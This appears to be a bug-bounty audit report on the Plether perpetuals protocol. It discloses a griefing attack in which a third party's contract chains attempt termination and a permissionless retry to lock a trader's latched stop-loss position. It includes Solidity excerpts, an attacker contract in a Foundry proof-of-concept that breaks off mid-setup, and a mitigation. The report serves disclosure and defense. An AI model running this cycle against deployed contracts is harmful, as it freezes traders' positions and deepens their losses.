# \#98038 [SC-High] Permissionless retry chained with attempt termination denies the owner of a latched position protection its only amend window and locks the protected position for as long as a third party pays gas

**Submitted on Nov 4th 2026 at 15:03:38 UTC by @abarbatei for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98038
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

A take-profit or stop-loss protection whose trader-chosen close ceilings cannot be satisfied by the market close fails every attempt and returns to `Latched`. The protocol's only owner remedy in that state is [`PositionProtectionBook::amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328), which requires status `Latched` and an empty account order queue. Both facts are controlled by anyone: terminal failure of the live attempt (expiry, or a deterministic ceiling violation at the queue head) and the retry that re-queues a fresh attempt are permissionless, carry no owner priority and no cooldown, and compose in one transaction. A third party that terminalizes the live attempt and immediately retries in the same transaction makes sure no block ever ends in the amendable state. Because every ordinary order commit is rejected while a protection is active and a `Triggered` or `Latched` protection can be neither cancelled nor replaced, the owner cannot amend, close, reduce, cancel or replace the protected position for as long as the attacker pays about 0.9 million gas per minute. The proof sustains the lock through 64 consecutive cycles (more than one hour of chain time), with 129 owner amend transactions reverting at every point they could be sent, and shows the position closing in the first block after the attacker stops.

## Vulnerability Details

### Intended behaviour

A protection stores four financial ceilings chosen by the trader (execution notional, gross account debit, action charge, explicit fees). When a trigger fires, the Router queues a full-position market close that copies those ceilings; if the close fails for a non-liquidation reason while the exact position remains, the protection returns to `Latched` and anyone may queue a fresh attempt with [`PositionProtectionBook::retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406). The ceilings are a security property (the protocol added them so keepers cannot close a trader under worse economics than the trader authorized), and the owner is expected to relax them when they bind. The canonical entrypoint list states it in [`CANONICAL_ENTRYPOINTS.md#L145-L148`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L145-L148): "The owner may amend the close ceilings of a `Latched` protection ... when the account has no pending Router order", and the retry is described in [`CANONICAL_ENTRYPOINTS.md#L257-L259`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L257-L259) as "permissionless, nonpayable, and valid only when the protection has no live attempt". The deployment guide tells honest keepers to "investigate planner, constraint, or other persistent failures before retrying; do not continuously queue the same failing attempt" ([`DEPLOYMENT.md#L416-L421`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L416-L421)). The program rules state that keepers are not trusted and that harm caused by any caller acting as a keeper is in scope.

### Root cause

The owner's amend requires two facts at once, in the [`PositionProtectionBook::amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328) function:

```solidity
    function amendLatchedPositionProtectionCloseLimits(
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external nonReentrant {
        StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
            revert OrderRouter__PendingOrdersExist();
        }
        _setCloseLimits(protection, limits);
        _emitCloseLimitsUpdated(protection);
    }
```

The retry has no owner check (`_activeProtection` instead of `_ownedActiveProtection`), no block or time gate, and consumes exactly the state the amend needs, in the [`PositionProtectionBook::retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406) function:

```solidity
    function retryPositionProtectionClose(
        uint64 protectionId
    ) external nonReentrant returns (uint64 linkedOrderId) {
        StoredProtection storage protection = _activeProtection(protectionId);
        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
            revert OrderRouter__ProtectionNotLatched();
        }
        _requireMatchingPosition(protection);

        IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
        if (router.pendingOrderCounts(protection.account) != 0) {
            revert OrderRouter__PendingOrdersExist();
        }

        if (protection.linkedOrderId == 0 || _attemptProtectionIds[protection.linkedOrderId] != 0) {
            revert PositionProtectionBook__InvalidLinkedOrder();
        }
        uint64 expectedOrderId = router.nextCommitId();
        linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
            .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
        if (linkedOrderId != expectedOrderId) {
            revert PositionProtectionBook__InvalidHostResponse();
        }
        _recordCloseAttempt(protection, linkedOrderId);
    }
```

The retried close reuses the stored ceilings unchanged, in the [`OrderLiquidationBatchLogic::_protectionCloseRequest` lines 666-677](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L666-L677) function:

```solidity
        request.sizeDelta = size;
        request.targetPrice = side == CfdTypes.Side.LONG ? host.engine().CAP_PRICE() : 1;
        request.isClose = true;
        request.bounds.submitBy = uint64(block.timestamp);
        request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = ALL_V3_EXECUTION_MODES;
        request.bounds.expectedConfigHash = bytes32(0);
        request.bounds.maxExecutionBountyAssets = 0;
        request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
        request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
        request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
        request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

Terminalization of the live attempt is also permissionless, by two routes. After the 60-second execution window, an expired attempt can be cleared by id even behind a live FIFO head, in the [`OrderRecoverySidecar::clearInvalidOrders` lines 84-91](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L84-L91) function (the public entrypoint is [`OrderRouter::clearInvalidOrders`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L199-L204)):

```solidity
            uint64 orderId = orderIds[nextIndex];
            OrderV3Types.PendingIntent memory pending = book.pendingIntent(orderId);
            if (pending.account == address(0)) {
                continue;
            }

            bytes32 observedConfigHash = book.currentExecutionConfigHash();
            bool expired = block.timestamp > pending.timing.executionDeadline;
```

Inside the window, executing the attempt at the queue head with any qualifying tick makes the policy evaluator raise a typed `ConstraintViolation` when the trader's ceiling binds, which the Router classifies as terminal. For the gross-debit ceiling the assessed quantity is the realized loss plus carry and charges, in the [`CfdOrderPolicyEvaluatorBase::_assessClose` lines 409-411](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L409-L411) function:

```solidity
        assessment.executionNotionalAssets = CfdMath.sizeToLots(delta.sizeDelta) * delta.price;
        assessment.grossAccountDebitAssets = delta.pricePnlClaimConsumedAssets + delta.pricePnlPledgeConsumedAssets
            + delta.realizedCarryAssets + delta.actionChargeCollectedAssets + executionBountyAssets;
```

and the bound is enforced in the [`CfdOrderPolicyEvaluatorBase::_enforceBounds` lines 504-507](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L504-L507) function:

```solidity
        _requireMaximum(
            OrderV3Types.ConstraintKind.GrossAccountDebit,
            assessment.grossAccountDebitAssets,
            bounds.maxGrossAccountDebitAssets
```

Either route settles the attempt as failed and the Router hands it back to the Book, in the [`OrderRouter::_settleTerminalBounty` lines 324-329](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L324-L329) function:

```solidity
        if (!success && lifecycleBook.isProtectionAttempt(order.orderId)) {
            if (bountyAssets != 0) {
                revert OrderRouter__ProtectedCloseBountyNonzero(bountyAssets);
            }
            positionProtectionBook.handleFailedProtectionAttempt(order.orderId, order.account, reason);
        }
```

which relatches because the exact position still exists, in the [`PositionProtectionBook::handleFailedProtectionAttempt` lines 662-667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L662-L667) function:

```solidity
        delete _attemptProtectionIds[orderId];
        retained = _positionMatches(protection);
        emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
        if (retained) {
            protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
            return true;
```

The Router record is deleted in the same frame, so the account queue is empty for the rest of that transaction. An attacker contract that calls the terminalization and then `retryPositionProtectionClose` in one transaction therefore leaves every block in the state `Triggered` with one live child. Meanwhile the owner's other exits are closed by design. Cancellation accepts only `PendingOpen` or `Armed`, in the [`PositionProtectionBook::_cancel` lines 413-418](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L413-L418) function (the same status rule gates [`PositionProtectionBook::replacePositionProtection`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L257-L262) through its internal status rule, and [`PositionProtectionBook::cancelPositionProtectionAndCommitClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L368) requires `Armed`):

```solidity
        PositionProtectionTypes.PositionProtectionStatus status = protection.status;
        if (
            status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
                && status != PositionProtectionTypes.PositionProtectionStatus.Armed
        ) {
            revert OrderRouter__ProtectionNotArmed();
```

and every public order commit is refused while any protection is active, in the [`OrderLiquidationBatchLogic::_validateFreshRequest` lines 313-315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315) function:

```solidity
        if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
            revert OrderRouter__ProtectionActive();
        }
```

So the amend is the owner's only remedy, and its precondition is a state that any third party can make unobservable.

### Attack sequence

1. A trader holds a 300,000 USDG notional LONG position and arms a stop loss at 1.02 with `maxGrossAccountDebitAssets` set to the loss it expects at the stop plus the execution fee, with a 10% buffer (6,734.64 USDG). All other ceilings are unlimited.
2. The market moves through the stop to 1.03. Any keeper triggers the protection (the attacker does, and collects the trigger bounty). The queued close now carries a gross debit of 9,123.6 USDG, above the ceiling, so every attempt fails with `ConstraintViolation(GrossAccountDebit)` and relatches.
3. Route A, inside the attempt window: within seconds of each commit the attacker's contract executes the attempt at the head with a qualifying Pyth tick (terminal failure, relatch) and calls `retryPositionProtectionClose` in the same transaction. The attempt never reaches its deadline, so the owner's oracle-free `expireOrder` reverts `OrderRouter__OrderNotExpired` in every block.
4. Route B, oracle-free: the attacker lets the 60-second window lapse, then calls `clearInvalidOrders([child])` and `retryPositionProtectionClose` in one transaction.
5. Every block ends `Triggered` with one live child. The owner's `amendLatchedPositionProtectionCloseLimits` reverts `OrderRouter__ProtectionNotLatched` whether sent before the attacker's transaction, after it, or after the owner's own `expireOrder` (the attacker's clear is then a no-op and its retry still succeeds). `commitOrder` with a close reverts `OrderRouter__ProtectionActive`; `cancelPositionProtection`, `cancelPositionProtectionAndCommitClose` and `replacePositionProtection` revert `OrderRouter__ProtectionNotArmed`.
6. The attacker repeats step 3 or 4 once per attempt for as long as it is willing to pay gas. The position stays open at the trader's full exposure. The trader can still withdraw free settlement and can still be liquidated.

### Why the owner cannot counter

The amendable state (`Latched`, empty queue) exists only between a terminalization and the next retry. Nothing gives the owner priority over a third party in that interval: the retry has no owner check, no cooldown and no block gate, and the Book has no owner-only terminalize-and-amend action. An owner who sends one call per transaction (an externally owned account, or a smart account driven by the protocol's SDK, whose amend action plan is a single call and whose expiry and retry builders are keeper calls) needs its amend sequenced at a point where the state holds. The attacker's cycle transaction is valid at every such point: on an attempt that is still pending it terminalizes and retries, on an attempt the owner has just expired the clear is a no-op and the retry still re-queues. Arbitrum's sequencer orders transactions by arrival; the attacker wins a cycle whenever its transaction is sequenced between the owner's terminalization and the owner's amend. Against a wallet user, whose two confirmations are seconds apart and whose interface never shows the window, one cycle transaction per L2 block suffices; against a scripted owner that submits both calls back to back the attacker must submit at a higher rate than the owner's gap between transactions, which raises its gas cost but not the owner's options. On route A the owner's only oracle-free terminalization never becomes available at all. A wallet user cannot even see the window: no block ever exposes it, so an interface that enables actions from chain state never offers the amend. An owner who writes a custom contract or batch that terminalizes, amends and retries atomically turns each cycle into a first-arrival race at the sequencer; the attacker cannot bound its win streak against such an owner, but that owner must know the race exists, hold a batching account, and on route A hold a signed Pyth payload for the 15-second settlement window of every attempt. The production trading account is a smart account that can batch calls, so the shortfall is in the shipped action plans and interface, not in the account type; a batching owner turns each cycle into a race the attacker cannot bound. This report claims the lock against the single-call owner class, which is every owner using the shipped SDK plans, the web interface, or an externally owned account.

### Preconditions and how the failing ceiling arises

The attacker needs no role, no capital in the protocol and no price manipulation; it pays gas. The only precondition is a stored ceiling that the market close cannot meet, and the ceilings exist precisely so that traders set them: the protocol's integration guide tells callers to use the unlimited sentinel "only when your account policy intentionally permits that exposure" and requires four explicit close limits on every protection (`packages/perps/WORKING_WITH_AI_AGENTS.md`), and the client SDK supplies no default for them. The current web interface exposes only trigger prices and does not offer the amend for a latched protection, so the affected population is SDK and agent users, the class the guide addresses. The proof uses the most ordinary case: a stop loss whose gross-debit bound is the loss the trader expected at the stop, breached by a 1% move beyond the stop. Other sources of the same state, all without any attacker involvement: a `maxExplicitFeesAssets` sized to the 4 bps execution fee fails every frozen-market close, because the 50 bps frozen-close spread enters explicit fees; a `maxExecutionNotionalAssets` at creation-time notional fails the stop leg of every LONG, because that leg only triggers at a higher price; an owner fee increase after its timelock pushes charges past any ceiling sized before it. The precondition text of the prior audit's own finding on the ceilings names this drift: "execution happens later under worse carry, fee, or frozen-spread conditions than when the user originally set the protection" (audit finding MED-9). One source does not qualify and is excluded from this report: a ceiling breached only by accrued carry can be defused by the owner with a plain settlement deposit, which realizes carry before the next attempt.

### Why this is not an accepted limitation

The permissionless retry was introduced with the statement that "poorly timed retries can add FIFO and gas pressure through repeated expiry cycles" and that it "allows third parties to enqueue attempts at suboptimal times" (plether-core pull request 78). That acceptance contemplates queue and gas pressure, and it predates the owner amend path, which was added by pull request 124 with the assumption that "the owner may amend limits after relatch". The audit acceptance of the ceilings (MED-9) relies on the same assumption: "Tight limits may prevent execution until conditions improve or the owner amends them." The repository's keeper limitations ([`SECURITY.md#L1356-L1359`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359)) accept the opposite regime: "Liveness depends on keepers processing the terminal attempt and separately appending a retry, and operators must alert on prolonged `Latched` state without a live child", that is, keeper inactivity, which an alert can detect. None of these texts describes a third party keeping the queue permanently non-empty so that the owner-only amend, the remedy those acceptances rely on, is unreachable; an alert on prolonged `Latched` never fires here because the protection is `Triggered` at every block boundary. The atomic owner exit added for MED-30 explicitly excludes `Triggered` and `Latched` records, which is why no alternative exit exists.

## Impact Details

Selected impact: Griefing (no profit motive for an attacker, but damage to the users or the protocol), Medium under the program's custom list.

The attacker earns nothing from the cycle (retries carry no bounty; the trigger bounty is paid once and would have gone to whichever keeper triggered). The victim loses every voluntary control over an open leveraged position: it cannot close at the market, cannot reduce, cannot relax or tighten its stop, cannot cancel the protection, and cannot replace it. Its position margin stays committed and its full market exposure persists. The remaining exits are the market coming back inside the trader's own bound, the attacker stopping, or liquidation, which charges the liquidation fee and pays the liquidator.

Measured in the proof at the release parameters:

| Quantity | Value |
| :-- | :-- |
| Protected position | 300,000 USDG notional LONG, 29,580 USDG margin |
| Trader's gross-debit ceiling | 6,734.64 USDG (expected 6,122.4 USDG at the stop, plus 10%) |
| Loss plus execution fee of the close at the breach price 1.03 (the assessed gross debit also adds accrued carry) | 9,123.6 USDG |
| Consecutive attacker cycles | 64 (3 execute-fail, 61 expiry) |
| Chain time the owner was locked out | 3,724 seconds |
| Owner amend transactions, all reverted | 129 |
| Attacker gas per expiry cycle (measured in-contract) | 908,964 average, 684,920 to 937,824 |
| Attacker gas per execute-fail cycle | 1,195,188 |
| Gas measurement | in-contract; intrinsic and calldata cost excluded |
| Loss the trader asked to realize when first denied | 9,000 USDG |
| Loss realized once the lock ended (market at 1.05) | 15,000 USDG (15,136 USDG debited including fee and carry) |

At one expiry cycle per minute the attacker spends about 1.3 billion gas per day. At Arbitrum One's 0.01 gwei base-fee floor that is about 0.013 ETH per day before the small L1 data component, that is, tens of dollars per day per victim, against a victim whose entire position exposure is frozen. A development run of the same loop with a raised test gas limit (not included here) sustained 1,443 cycles, 88,023 seconds, and met no protocol limit, so the duration is bounded only by the attacker's willingness to pay. The proof also satisfies the program's "Temporary freezing of funds for at least 1 hour" wording for the position margin; Griefing is selected because it does not depend on a duration threshold.

## Mitigation

Give the owner a path to the amend that no third party can pre-empt. The smallest change that addresses the root cause: drop the empty-queue requirement from `amendLatchedPositionProtectionCloseLimits` and accept both `Triggered` and `Latched`. The amended ceilings are stored on the protection and are read only when the next attempt is built by `_protectionCloseRequest`, so a live child keeps the bounds it already copied and the next retry picks up the new ones; no queue invariant is touched. With that change the attacker's cycle no longer denies anything, because the owner amends at any time and the attacker's own next retry executes with the amended limits.

```solidity
    function amendLatchedPositionProtectionCloseLimits(
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits calldata limits
    ) external nonReentrant {
        StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
        PositionProtectionTypes.PositionProtectionStatus status = protection.status;
        if (
            status != PositionProtectionTypes.PositionProtectionStatus.Latched
                && status != PositionProtectionTypes.PositionProtectionStatus.Triggered
        ) {
            revert OrderRouter__ProtectionNotLatched();
        }
        _setCloseLimits(protection, limits);
        _emitCloseLimitsUpdated(protection);
    }
```

If the design wants the live child to use the new limits at once, add an owner-only `amendAndRetryPositionProtectionClose` that expires or cancels the live child, stores the limits and queues the retry in one call. Independently, a short owner-priority window after each terminal attempt (a permissionless retry admitted only once a few blocks have passed since the previous attempt's terminal block, while the owner may retry immediately) removes the atomic composition that this report relies on.

## References

- [`PositionProtectionBook::amendLatchedPositionProtectionCloseLimits`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328): owner amend, requires `Latched` and an empty account queue.
- [`PositionProtectionBook::retryPositionProtectionClose`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406): permissionless retry with the same precondition and no block gate.
- [`PositionProtectionBook::_cancel`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L429): cancellation only for `PendingOpen` and `Armed`.
- [`PositionProtectionBook::handleFailedProtectionAttempt`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675): relatch on any failed attempt while the exact position remains.
- [`OrderLiquidationBatchLogic::_validateFreshRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L270-L319): public commits rejected while a protection is active.
- [`OrderLiquidationBatchLogic::_protectionCloseRequest`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680): every attempt reuses the stored ceilings.
- [`OrderRecoverySidecar::clearInvalidOrders`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol#L67-L115): expired attempts cleared by id behind a live head.
- [`OrderRouter::_settleTerminalBounty`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L314-L344): failed protection attempts routed to the Book.
- [`OrderRouterExecutionSidecar::_classifyTypedFailure`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L827-L894): `ConstraintViolation` classified as terminal.
- [`CfdOrderPolicyEvaluatorBase::_enforceBounds`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L490-L540): ceiling enforcement order.
- [`CANONICAL_ENTRYPOINTS.md#L145-L148`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L145-L148) and [`CANONICAL_ENTRYPOINTS.md#L257-L259`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L257-L259): documented owner amend and permissionless retry.
- [`DEPLOYMENT.md#L416-L421`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L416-L421): honest-keeper guidance not to re-queue a failing attempt.
- [`SECURITY.md#L1356-L1359`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359): accepted keeper-inactivity limitation (prolonged `Latched` without a live child).
- Pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8).


## Proof of Concept

## Proof of Concept

Setup. The proof is a Foundry test in the repository's own perps test suite at the pinned commit [a82d4fefb02768e5b3bddcc97dee371eee24fea8](https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8). It extends the existing fixture `packages/perps/test/perps/BasePerpTest.sol` (release carry rate, mock USDG, mock Pyth) and modifies no contract in scope. Place the file at `packages/perps/test/poc/latched-amend-denial/ProofPermissionlessRetryDeniesLatchedAmend.t.sol` and run from `packages/perps`:

```
FOUNDRY_TEST=test/poc/latched-amend-denial forge test --match-path 'test/poc/latched-amend-denial/*.t.sol' -vv
```

`FOUNDRY_TEST` bounds the via-IR compile to the sources plus the proof directory, the same narrowing the package's own CI script applies; on a machine that can compile the whole test tree the plain `forge test --match-path` form works too. Every attacker and victim step is a transaction from that address to a public entrypoint (`OrderRouter.commitOrder` with the production bounded request, `executeOrder` with Pyth data, `updateMarkPrice`, `expireOrder`, `clearInvalidOrders`, and the Book's `createPositionProtection`, `triggerPositionProtection`, `retryPositionProtectionClose`, `amendLatchedPositionProtectionCloseLimits`, `cancelPositionProtection`, `cancelPositionProtectionAndCommitClose`, `replacePositionProtection`). The attacker's two-call cycle runs from its own contract. Suite helpers are used only to fund the trader before the attack and to drive the out-of-scope Pyth mock; no protocol contract is impersonated.

What the single test asserts: (1) with the trader's gross-debit ceiling breached, the first attempt fails with `ConstraintViolation` on `GrossAccountDebit` and relatches; (2) across 64 consecutive attacker cycles on both routes, every block ends `Triggered` with one live child and the position unchanged, and all 129 owner amend transactions revert, including the ones sent right after the owner's own `expireOrder`; (3) during the lock the owner's close commit reverts `ProtectionActive`, and cancel, cancel-and-close and replace revert `ProtectionNotArmed`; (4) the lock spans more than one hour of chain time; (5) in the first block after the attacker stops, the owner's expire, amend and retry succeed and the amended retry closes the position, so the cycle alone denied the remedy, and the loss realized at that point exceeds the loss the trader asked to realize when first denied.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdOrderPolicyEvaluator} from "@plether/perps/interfaces/ICfdOrderPolicyEvaluator.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice The griefer's keeper contract. It calls only permissionless Router and Book entrypoints, but it chains
///         the terminalization of the live close attempt and the retry in one transaction, so the "Latched with an
///         empty account queue" state that the owner-only amend requires never survives to the end of a block.
contract RetryCycleKeeper {

    OrderRouter private immutable ROUTER;
    IPositionProtectionActions private immutable BOOK;

    constructor(
        address router,
        address book
    ) {
        ROUTER = OrderRouter(payable(router));
        BOOK = IPositionProtectionActions(book);
    }

    receive() external payable {}

    /// @dev Route A: execute the live attempt at the FIFO head with a qualifying tick inside its execution window.
    ///      The stored ceiling makes the policy evaluator raise a terminal ConstraintViolation, the Book relatches,
    ///      and the retry re-queues before the transaction ends. The attempt never reaches its expiry deadline.
    function executeFailAndRetry(
        uint64 childId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external payable returns (uint64 nextChildId, uint256 gasUsed) {
        uint256 gasStart = gasleft();
        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder{value: msg.value}(childId, pythUpdateData);
        require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt did not fail");
        nextChildId = BOOK.retryPositionProtectionClose(protectionId);
        gasUsed = gasStart - gasleft();
    }

    /// @dev Route B (oracle-free): once the attempt's execution window has elapsed, clear it by id and retry.
    function expireAndRetry(
        uint64 childId,
        uint64 protectionId
    ) external returns (uint64 nextChildId, uint256 gasUsed) {
        uint256 gasStart = gasleft();
        uint64[] memory ids = new uint64[](1);
        ids[0] = childId;
        ROUTER.clearInvalidOrders(ids);
        nextChildId = BOOK.retryPositionProtectionClose(protectionId);
        gasUsed = gasStart - gasleft();
    }

}

/**
 * End-to-end proof. A trader (an ordinary address, no privileges) holds a LONG position with a stop loss whose
 * stored gross-debit ceiling bounds the loss it is willing to realize at the stop. The market jumps through the stop
 * by more than that bound, so every protection close attempt fails deterministically (ConstraintViolation on
 * GrossAccountDebit) and the protection relatches. The protocol's documented remedy is the owner-only
 * amendLatchedPositionProtectionCloseLimits, which requires status Latched AND an empty account queue.
 *
 * A third party ("griefer") with no role runs a contract that terminalizes the live attempt and calls the
 * permissionless retryPositionProtectionClose in the same transaction. The owner, sending ordinary single-call
 * transactions, never finds a block in which the amend precondition holds: every amend reverts, every cancel and
 * replace reverts, and every ordinary close commit reverts with OrderRouter__ProtectionActive. The proof runs 64
 * consecutive cycles (more than one hour of chain time) through both terminalization routes, records the griefer's
 * gas per cycle, and finally shows that the amend path works the moment the griefer stops, which isolates the
 * cycle as the only thing that denied it.
 *
 * Every attacker and victim step goes through public entrypoints. Suite helpers are used only to fund the trader
 * before the attack and to drive the out-of-scope Pyth mock.
 */
contract ProofPermissionlessRetryDeniesLatchedAmend is BasePerpTest {

    address internal constant TRADER = address(0x7A4DE0);
    address internal constant GRIEFER = address(0x6A1EF0);

    uint256 internal constant ENTRY_PRICE = 1e8; // 1.00
    uint256 internal constant STOP_LOSS = 102_000_000; // LONG stop loss: triggers once the mark is >= 1.02
    uint256 internal constant BREACH_PRICE = 103_000_000; // the market jumps through the stop to 1.03
    uint256 internal constant TREND_PRICE = 105_000_000; // and keeps moving against the locked position
    uint256 internal constant SIZE = 3e23; // 3,000 lots: 300,000 USDG notional at 1.00
    uint256 internal constant MARGIN = 30_000e6;
    uint256 internal constant ROUTE_A_CYCLES = 3;
    uint256 internal constant CYCLES = 64;

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal views;
    RetryCycleKeeper internal keeper;

    struct Tally {
        uint256 amendReverts;
        uint256 cycles;
        uint256 gasA;
        uint256 gasBMin;
        uint256 gasBMax;
        uint256 gasBTotal;
    }

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));

        // Pre-attack funding (suite helper) and native gas for both parties.
        _fundTrader(TRADER, 40_000e6);
        vm.deal(TRADER, 1 ether);
        vm.deal(GRIEFER, 1 ether);

        vm.prank(GRIEFER);
